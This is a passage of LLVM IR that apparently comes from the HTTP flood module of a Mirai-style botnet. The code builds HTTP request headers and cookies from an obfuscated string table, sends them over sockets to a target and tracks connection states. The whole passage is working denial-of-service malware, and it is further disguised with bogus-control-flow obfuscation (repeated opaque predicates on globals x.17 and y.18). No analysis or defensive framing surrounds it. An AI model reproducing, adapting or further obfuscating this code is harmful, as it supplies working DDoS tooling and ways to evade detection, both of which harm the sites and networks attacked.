  %1010 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1009, i32 0, i32 7
  %1011 = getelementptr inbounds [129 x i8], [129 x i8]* %1010, i32 0, i32 0
  %1012 = call i32 @util_strcpy(i8* %1008, i8* %1011)
  %1013 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1014 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1015 = call i32 @util_strlen(i8* %1014)
  %1016 = sext i32 %1015 to i64
  %1017 = getelementptr inbounds i8, i8* %1013, i64 %1016
  %1018 = call i32 @util_strcpy(i8* %1017, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 39)
  %1019 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1020 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1021 = call i32 @util_strlen(i8* %1020)
  %1022 = sext i32 %1021 to i64
  %1023 = getelementptr inbounds i8, i8* %1019, i64 %1022
  %1024 = call i8* @table_retrieve_val(i32 39, i32* null)
  %1025 = call i32 @util_strcpy(i8* %1023, i8* %1024)
  call void @table_lock_val(i8 zeroext 39)
  %1026 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1027 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1028 = call i32 @util_strlen(i8* %1027)
  %1029 = sext i32 %1028 to i64
  %1030 = getelementptr inbounds i8, i8* %1026, i64 %1029
  %1031 = call i32 @util_strcpy(i8* %1030, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 40)
  %1032 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1033 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1034 = call i32 @util_strlen(i8* %1033)
  %1035 = sext i32 %1034 to i64
  %1036 = getelementptr inbounds i8, i8* %1032, i64 %1035
  %1037 = call i8* @table_retrieve_val(i32 40, i32* null)
  %1038 = call i32 @util_strcpy(i8* %1036, i8* %1037)
  call void @table_lock_val(i8 zeroext 40)
  %1039 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1040 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1041 = call i32 @util_strlen(i8* %1040)
  %1042 = sext i32 %1041 to i64
  %1043 = getelementptr inbounds i8, i8* %1039, i64 %1042
  %1044 = call i32 @util_strcpy(i8* %1043, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 41)
  %1045 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1046 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1047 = call i32 @util_strlen(i8* %1046)
  %1048 = sext i32 %1047 to i64
  %1049 = getelementptr inbounds i8, i8* %1045, i64 %1048
  %1050 = call i8* @table_retrieve_val(i32 41, i32* null)
  %1051 = call i32 @util_strcpy(i8* %1049, i8* %1050)
  call void @table_lock_val(i8 zeroext 41)
  %1052 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1053 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1054 = call i32 @util_strlen(i8* %1053)
  %1055 = sext i32 %1054 to i64
  %1056 = getelementptr inbounds i8, i8* %1052, i64 %1055
  %1057 = call i32 @util_strcpy(i8* %1056, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %1058 = load i8*, i8** %14, align 8
  %1059 = icmp ne i8* %1058, null
  %1060 = load i32, i32* @x.17
  %1061 = load i32, i32* @y.18
  %1062 = sub i32 %1060, 1
  %1063 = mul i32 %1060, %1062
  %1064 = urem i32 %1063, 2
  %1065 = icmp eq i32 %1064, 0
  %1066 = icmp slt i32 %1061, 10
  %1067 = or i1 %1065, %1066
  br i1 %1067, label %originalBBpart2161, label %originalBB159alteredBB

originalBBpart2161:                               ; preds = %originalBB159
  br i1 %1059, label %1068, label %1109

; <label>:1068:                                   ; preds = %originalBBpart2161
  call void @table_unlock_val(i8 zeroext 42)
  %1069 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1070 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1071 = call i32 @util_strlen(i8* %1070)
  %1072 = sext i32 %1071 to i64
  %1073 = getelementptr inbounds i8, i8* %1069, i64 %1072
  %1074 = call i8* @table_retrieve_val(i32 42, i32* null)
  %1075 = call i32 @util_strcpy(i8* %1073, i8* %1074)
  call void @table_lock_val(i8 zeroext 42)
  %1076 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1077 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1078 = call i32 @util_strlen(i8* %1077)
  %1079 = sext i32 %1078 to i64
  %1080 = getelementptr inbounds i8, i8* %1076, i64 %1079
  %1081 = call i32 @util_strcpy(i8* %1080, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %1082 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1083 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1084 = call i32 @util_strlen(i8* %1083)
  %1085 = sext i32 %1084 to i64
  %1086 = getelementptr inbounds i8, i8* %1082, i64 %1085
  %1087 = call i8* @table_retrieve_val(i32 47, i32* null)
  %1088 = call i32 @util_strcpy(i8* %1086, i8* %1087)
  %1089 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1090 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1091 = call i32 @util_strlen(i8* %1090)
  %1092 = sext i32 %1091 to i64
  %1093 = getelementptr inbounds i8, i8* %1089, i64 %1092
  %1094 = call i32 @util_strcpy(i8* %1093, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %1095 = load i8*, i8** %14, align 8
  %1096 = call i32 @util_strlen(i8* %1095)
  %1097 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1098 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1099 = call i32 @util_strlen(i8* %1098)
  %1100 = sext i32 %1099 to i64
  %1101 = getelementptr inbounds i8, i8* %1097, i64 %1100
  %1102 = call i8* @util_itoa(i32 %1096, i32 10, i8* %1101)
  %1103 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1104 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1105 = call i32 @util_strlen(i8* %1104)
  %1106 = sext i32 %1105 to i64
  %1107 = getelementptr inbounds i8, i8* %1103, i64 %1106
  %1108 = call i32 @util_strcpy(i8* %1107, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %1109

; <label>:1109:                                   ; preds = %1068, %originalBBpart2161
  %1110 = load i32, i32* @x.17
  %1111 = load i32, i32* @y.18
  %1112 = sub i32 %1110, 1
  %1113 = mul i32 %1110, %1112
  %1114 = urem i32 %1113, 2
  %1115 = icmp eq i32 %1114, 0
  %1116 = icmp slt i32 %1111, 10
  %1117 = or i1 %1115, %1116
  br i1 %1117, label %originalBB163, label %originalBB163alteredBB

originalBB163:                                    ; preds = %originalBB163alteredBB, %1109
  %1118 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1119 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1118, i32 0, i32 15
  %1120 = load i32, i32* %1119, align 4
  %1121 = icmp sgt i32 %1120, 0
  %1122 = load i32, i32* @x.17
  %1123 = load i32, i32* @y.18
  %1124 = sub i32 %1122, 1
  %1125 = mul i32 %1122, %1124
  %1126 = urem i32 %1125, 2
  %1127 = icmp eq i32 %1126, 0
  %1128 = icmp slt i32 %1123, 10
  %1129 = or i1 %1127, %1128
  br i1 %1129, label %originalBBpart2165, label %originalBB163alteredBB

originalBBpart2165:                               ; preds = %originalBB163
  br i1 %1121, label %1130, label %1188

; <label>:1130:                                   ; preds = %originalBBpart2165
  %1131 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1132 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1133 = call i32 @util_strlen(i8* %1132)
  %1134 = sext i32 %1133 to i64
  %1135 = getelementptr inbounds i8, i8* %1131, i64 %1134
  %1136 = call i32 @util_strcpy(i8* %1135, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %10, align 4
  br label %1137

; <label>:1137:                                   ; preds = %1162, %1130
  %1138 = load i32, i32* %10, align 4
  %1139 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1140 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1139, i32 0, i32 15
  %1141 = load i32, i32* %1140, align 4
  %1142 = icmp slt i32 %1138, %1141
  br i1 %1142, label %1143, label %1165

; <label>:1143:                                   ; preds = %1137
  %1144 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1145 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1146 = call i32 @util_strlen(i8* %1145)
  %1147 = sext i32 %1146 to i64
  %1148 = getelementptr inbounds i8, i8* %1144, i64 %1147
  %1149 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1150 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1149, i32 0, i32 16
  %1151 = load i32, i32* %10, align 4
  %1152 = sext i32 %1151 to i64
  %1153 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1150, i64 0, i64 %1152
  %1154 = getelementptr inbounds [128 x i8], [128 x i8]* %1153, i32 0, i32 0
  %1155 = call i32 @util_strcpy(i8* %1148, i8* %1154)
  %1156 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1157 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1158 = call i32 @util_strlen(i8* %1157)
  %1159 = sext i32 %1158 to i64
  %1160 = getelementptr inbounds i8, i8* %1156, i64 %1159
  %1161 = call i32 @util_strcpy(i8* %1160, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  br label %1162

; <label>:1162:                                   ; preds = %1143
  %1163 = load i32, i32* %10, align 4
  %1164 = add nsw i32 %1163, 1
  store i32 %1164, i32* %10, align 4
  br label %1137

; <label>:1165:                                   ; preds = %1137
  %1166 = load i32, i32* @x.17
  %1167 = load i32, i32* @y.18
  %1168 = sub i32 %1166, 1
  %1169 = mul i32 %1166, %1168
  %1170 = urem i32 %1169, 2
  %1171 = icmp eq i32 %1170, 0
  %1172 = icmp slt i32 %1167, 10
  %1173 = or i1 %1171, %1172
  br i1 %1173, label %originalBB167, label %originalBB167alteredBB

originalBB167:                                    ; preds = %originalBB167alteredBB, %1165
  %1174 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1175 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1176 = call i32 @util_strlen(i8* %1175)
  %1177 = sext i32 %1176 to i64
  %1178 = getelementptr inbounds i8, i8* %1174, i64 %1177
  %1179 = call i32 @util_strcpy(i8* %1178, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %1180 = load i32, i32* @x.17
  %1181 = load i32, i32* @y.18
  %1182 = sub i32 %1180, 1
  %1183 = mul i32 %1180, %1182
  %1184 = urem i32 %1183, 2
  %1185 = icmp eq i32 %1184, 0
  %1186 = icmp slt i32 %1181, 10
  %1187 = or i1 %1185, %1186
  br i1 %1187, label %originalBBpart2169, label %originalBB167alteredBB

originalBBpart2169:                               ; preds = %originalBB167
  br label %1188

; <label>:1188:                                   ; preds = %originalBBpart2169, %originalBBpart2165
  %1189 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1190 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1191 = call i32 @util_strlen(i8* %1190)
  %1192 = sext i32 %1191 to i64
  %1193 = getelementptr inbounds i8, i8* %1189, i64 %1192
  %1194 = call i32 @util_strcpy(i8* %1193, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %1195 = load i8*, i8** %14, align 8
  %1196 = icmp ne i8* %1195, null
  br i1 %1196, label %1197, label %1205

; <label>:1197:                                   ; preds = %1188
  %1198 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1199 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1200 = call i32 @util_strlen(i8* %1199)
  %1201 = sext i32 %1200 to i64
  %1202 = getelementptr inbounds i8, i8* %1198, i64 %1201
  %1203 = load i8*, i8** %14, align 8
  %1204 = call i32 @util_strcpy(i8* %1202, i8* %1203)
  br label %1205

; <label>:1205:                                   ; preds = %1197, %1188
  %1206 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1207 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1206, i32 0, i32 9
  %1208 = getelementptr inbounds [9 x i8], [9 x i8]* %1207, i32 0, i32 0
  %1209 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1210 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1209, i32 0, i32 10
  %1211 = getelementptr inbounds [9 x i8], [9 x i8]* %1210, i32 0, i32 0
  %1212 = call signext i8 @util_strcmp(i8* %1208, i8* %1211)
  %1213 = icmp ne i8 %1212, 0
  br i1 %1213, label %1222, label %1214

; <label>:1214:                                   ; preds = %1205
  %1215 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1216 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1215, i32 0, i32 9
  %1217 = getelementptr inbounds [9 x i8], [9 x i8]* %1216, i32 0, i32 0
  %1218 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1219 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1218, i32 0, i32 10
  %1220 = getelementptr inbounds [9 x i8], [9 x i8]* %1219, i32 0, i32 0
  %1221 = call i32 @util_strcpy(i8* %1217, i8* %1220)
  br label %1222

; <label>:1222:                                   ; preds = %1214, %1205
  %1223 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1224 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1223, i32 0, i32 0
  %1225 = load i32, i32* %1224, align 4
  %1226 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1227 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1228 = call i32 @util_strlen(i8* %1227)
  %1229 = sext i32 %1228 to i64
  %1230 = call i64 @send(i32 %1225, i8* %1226, i64 %1229, i32 16384)
  %1231 = load i32, i32* %27, align 4
  %1232 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1233 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1232, i32 0, i32 3
  store i32 %1231, i32* %1233, align 4
  %1234 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1235 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1234, i32 0, i32 1
  store i8 6, i8* %1235, align 4
  %1236 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1237 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1236, i32 0, i32 0
  %1238 = load i32, i32* %1237, align 4
  %1239 = srem i32 %1238, 64
  %1240 = zext i32 %1239 to i64
  %1241 = shl i64 1, %1240
  %1242 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1243 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1244 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1243, i32 0, i32 0
  %1245 = load i32, i32* %1244, align 4
  %1246 = sdiv i32 %1245, 64
  %1247 = sext i32 %1246 to i64
  %1248 = getelementptr inbounds [16 x i64], [16 x i64]* %1242, i64 0, i64 %1247
  %1249 = load i64, i64* %1248, align 8
  %1250 = or i64 %1249, %1241
  store i64 %1250, i64* %1248, align 8
  %1251 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1252 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1251, i32 0, i32 0
  %1253 = load i32, i32* %1252, align 4
  %1254 = load i32, i32* %23, align 4
  %1255 = icmp sgt i32 %1253, %1254
  br i1 %1255, label %1256, label %1261

; <label>:1256:                                   ; preds = %1222
  %1257 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1258 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1257, i32 0, i32 0
  %1259 = load i32, i32* %1258, align 4
  %1260 = add nsw i32 %1259, 1
  store i32 %1260, i32* %23, align 4
  br label %1261

; <label>:1261:                                   ; preds = %1256, %1222
  br label %1453

; <label>:1262:                                   ; preds = %originalBBpart2157
  %1263 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1264 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1263, i32 0, i32 1
  %1265 = load i8, i8* %1264, align 4
  %1266 = zext i8 %1265 to i32
  %1267 = icmp eq i32 %1266, 6
  br i1 %1267, label %1268, label %1311

; <label>:1268:                                   ; preds = %1262
  %1269 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1270 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1269, i32 0, i32 0
  %1271 = load i32, i32* %1270, align 4
  %1272 = srem i32 %1271, 64
  %1273 = zext i32 %1272 to i64
  %1274 = shl i64 1, %1273
  %1275 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1276 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1277 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1276, i32 0, i32 0
  %1278 = load i32, i32* %1277, align 4
  %1279 = sdiv i32 %1278, 64
  %1280 = sext i32 %1279 to i64
  %1281 = getelementptr inbounds [16 x i64], [16 x i64]* %1275, i64 0, i64 %1280
  %1282 = load i64, i64* %1281, align 8
  %1283 = or i64 %1282, %1274
  store i64 %1283, i64* %1281, align 8
  %1284 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1285 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1284, i32 0, i32 0
  %1286 = load i32, i32* %1285, align 4
  %1287 = load i32, i32* %23, align 4
  %1288 = icmp sgt i32 %1286, %1287
  br i1 %1288, label %1289, label %1294

; <label>:1289:                                   ; preds = %1268
  %1290 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1291 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1290, i32 0, i32 0
  %1292 = load i32, i32* %1291, align 4
  %1293 = add nsw i32 %1292, 1
  store i32 %1293, i32* %23, align 4
  br label %1294

; <label>:1294:                                   ; preds = %1289, %1268
  %1295 = load i32, i32* @x.17
  %1296 = load i32, i32* @y.18
  %1297 = sub i32 %1295, 1
  %1298 = mul i32 %1295, %1297
  %1299 = urem i32 %1298, 2
  %1300 = icmp eq i32 %1299, 0
  %1301 = icmp slt i32 %1296, 10
  %1302 = or i1 %1300, %1301
  br i1 %1302, label %originalBB171, label %originalBB171alteredBB

originalBB171:                                    ; preds = %originalBB171alteredBB, %1294
  %1303 = load i32, i32* @x.17
  %1304 = load i32, i32* @y.18
  %1305 = sub i32 %1303, 1
  %1306 = mul i32 %1303, %1305
  %1307 = urem i32 %1306, 2
  %1308 = icmp eq i32 %1307, 0
  %1309 = icmp slt i32 %1304, 10
  %1310 = or i1 %1308, %1309
  br i1 %1310, label %originalBBpart2173, label %originalBB171alteredBB

originalBBpart2173:                               ; preds = %originalBB171
  br label %1452

; <label>:1311:                                   ; preds = %1262
  %1312 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1313 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1312, i32 0, i32 1
  %1314 = load i8, i8* %1313, align 4
  %1315 = zext i8 %1314 to i32
  %1316 = icmp eq i32 %1315, 7
  br i1 %1316, label %1317, label %1344

; <label>:1317:                                   ; preds = %1311
  %1318 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1319 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1318, i32 0, i32 0
  %1320 = load i32, i32* %1319, align 4
  %1321 = srem i32 %1320, 64
  %1322 = zext i32 %1321 to i64
  %1323 = shl i64 1, %1322
  %1324 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1325 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1326 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1325, i32 0, i32 0
  %1327 = load i32, i32* %1326, align 4
  %1328 = sdiv i32 %1327, 64
  %1329 = sext i32 %1328 to i64
  %1330 = getelementptr inbounds [16 x i64], [16 x i64]* %1324, i64 0, i64 %1329
  %1331 = load i64, i64* %1330, align 8
  %1332 = or i64 %1331, %1323
  store i64 %1332, i64* %1330, align 8
  %1333 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1334 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1333, i32 0, i32 0
  %1335 = load i32, i32* %1334, align 4
  %1336 = load i32, i32* %23, align 4
  %1337 = icmp sgt i32 %1335, %1336
  br i1 %1337, label %1338, label %1343

; <label>:1338:                                   ; preds = %1317
  %1339 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1340 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1339, i32 0, i32 0
  %1341 = load i32, i32* %1340, align 4
  %1342 = add nsw i32 %1341, 1
  store i32 %1342, i32* %23, align 4
  br label %1343

; <label>:1343:                                   ; preds = %1338, %1317
  br label %1451

; <label>:1344:                                   ; preds = %1311
  %1345 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1346 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1345, i32 0, i32 1
  %1347 = load i8, i8* %1346, align 4
  %1348 = zext i8 %1347 to i32
  %1349 = icmp eq i32 %1348, 10
  br i1 %1349, label %1350, label %1393

; <label>:1350:                                   ; preds = %1344
  %1351 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1352 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1351, i32 0, i32 0
  %1353 = load i32, i32* %1352, align 4
  %1354 = srem i32 %1353, 64
  %1355 = zext i32 %1354 to i64
  %1356 = shl i64 1, %1355
  %1357 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1358 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1359 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1358, i32 0, i32 0
  %1360 = load i32, i32* %1359, align 4
  %1361 = sdiv i32 %1360, 64
  %1362 = sext i32 %1361 to i64
  %1363 = getelementptr inbounds [16 x i64], [16 x i64]* %1357, i64 0, i64 %1362
  %1364 = load i64, i64* %1363, align 8
  %1365 = or i64 %1364, %1356
  store i64 %1365, i64* %1363, align 8
  %1366 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1367 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1366, i32 0, i32 0
  %1368 = load i32, i32* %1367, align 4
  %1369 = load i32, i32* %23, align 4
  %1370 = icmp sgt i32 %1368, %1369
  br i1 %1370, label %1371, label %1376

; <label>:1371:                                   ; preds = %1350
  %1372 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1373 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1372, i32 0, i32 0
  %1374 = load i32, i32* %1373, align 4
  %1375 = add nsw i32 %1374, 1
  store i32 %1375, i32* %23, align 4
  br label %1376

; <label>:1376:                                   ; preds = %1371, %1350
  %1377 = load i32, i32* @x.17
  %1378 = load i32, i32* @y.18
  %1379 = sub i32 %1377, 1
  %1380 = mul i32 %1377, %1379
  %1381 = urem i32 %1380, 2
  %1382 = icmp eq i32 %1381, 0
  %1383 = icmp slt i32 %1378, 10
  %1384 = or i1 %1382, %1383
  br i1 %1384, label %originalBB175, label %originalBB175alteredBB

originalBB175:                                    ; preds = %originalBB175alteredBB, %1376
  %1385 = load i32, i32* @x.17
  %1386 = load i32, i32* @y.18
  %1387 = sub i32 %1385, 1
  %1388 = mul i32 %1385, %1387
  %1389 = urem i32 %1388, 2
  %1390 = icmp eq i32 %1389, 0
  %1391 = icmp slt i32 %1386, 10
  %1392 = or i1 %1390, %1391
  br i1 %1392, label %originalBBpart2177, label %originalBB175alteredBB

originalBBpart2177:                               ; preds = %originalBB175
  br label %1450

; <label>:1393:                                   ; preds = %1344
  %1394 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1395 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1394, i32 0, i32 1
  %1396 = load i8, i8* %1395, align 4
  %1397 = zext i8 %1396 to i32
  %1398 = icmp eq i32 %1397, 11
  br i1 %1398, label %1399, label %1424

; <label>:1399:                                   ; preds = %1393
  %1400 = load i32, i32* @x.17
  %1401 = load i32, i32* @y.18
  %1402 = sub i32 %1400, 1
  %1403 = mul i32 %1400, %1402
  %1404 = urem i32 %1403, 2
  %1405 = icmp eq i32 %1404, 0
  %1406 = icmp slt i32 %1401, 10
  %1407 = or i1 %1405, %1406
  br i1 %1407, label %originalBB179, label %originalBB179alteredBB

originalBB179:                                    ; preds = %originalBB179alteredBB, %1399
  %1408 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1409 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1408, i32 0, i32 1
  store i8 0, i8* %1409, align 4
  %1410 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1411 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1410, i32 0, i32 0
  %1412 = load i32, i32* %1411, align 4
  %1413 = call i32 @close(i32 %1412)
  %1414 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1415 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1414, i32 0, i32 0
  store i32 -1, i32* %1415, align 4
  %1416 = load i32, i32* @x.17
  %1417 = load i32, i32* @y.18
  %1418 = sub i32 %1416, 1
  %1419 = mul i32 %1416, %1418
  %1420 = urem i32 %1419, 2
  %1421 = icmp eq i32 %1420, 0
  %1422 = icmp slt i32 %1417, 10
  %1423 = or i1 %1421, %1422
  br i1 %1423, label %originalBBpart2181, label %originalBB179alteredBB

originalBBpart2181:                               ; preds = %originalBB179
  br label %1449

; <label>:1424:                                   ; preds = %1393
  %1425 = load i32, i32* @x.17
  %1426 = load i32, i32* @y.18
  %1427 = sub i32 %1425, 1
  %1428 = mul i32 %1425, %1427
  %1429 = urem i32 %1428, 2
  %1430 = icmp eq i32 %1429, 0
  %1431 = icmp slt i32 %1426, 10
  %1432 = or i1 %1430, %1431
  br i1 %1432, label %originalBB183, label %originalBB183alteredBB

originalBB183:                                    ; preds = %originalBB183alteredBB, %1424
  %1433 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1434 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1433, i32 0, i32 1
  store i8 0, i8* %1434, align 4
  %1435 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1436 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1435, i32 0, i32 0
  %1437 = load i32, i32* %1436, align 4
  %1438 = call i32 @close(i32 %1437)
  %1439 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1440 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1439, i32 0, i32 0
  store i32 -1, i32* %1440, align 4
  %1441 = load i32, i32* @x.17
  %1442 = load i32, i32* @y.18
  %1443 = sub i32 %1441, 1
  %1444 = mul i32 %1441, %1443
  %1445 = urem i32 %1444, 2
  %1446 = icmp eq i32 %1445, 0
  %1447 = icmp slt i32 %1442, 10
  %1448 = or i1 %1446, %1447
  br i1 %1448, label %originalBBpart2185, label %originalBB183alteredBB

originalBBpart2185:                               ; preds = %originalBB183
  br label %1449

; <label>:1449:                                   ; preds = %originalBBpart2185, %originalBBpart2181
  br label %1450

; <label>:1450:                                   ; preds = %1449, %originalBBpart2177
  br label %1451

; <label>:1451:                                   ; preds = %1450, %1343
  br label %1452

; <label>:1452:                                   ; preds = %1451, %originalBBpart2173
  br label %1453

; <label>:1453:                                   ; preds = %1452, %1261
  br label %1454

; <label>:1454:                                   ; preds = %1453, %917
  br label %1455

; <label>:1455:                                   ; preds = %1454, %836
  br label %1456

; <label>:1456:                                   ; preds = %1455, %866, %originalBBpart284
  %1457 = load i32, i32* @x.17
  %1458 = load i32, i32* @y.18
  %1459 = sub i32 %1457, 1
  %1460 = mul i32 %1457, %1459
  %1461 = urem i32 %1460, 2
  %1462 = icmp eq i32 %1461, 0
  %1463 = icmp slt i32 %1458, 10
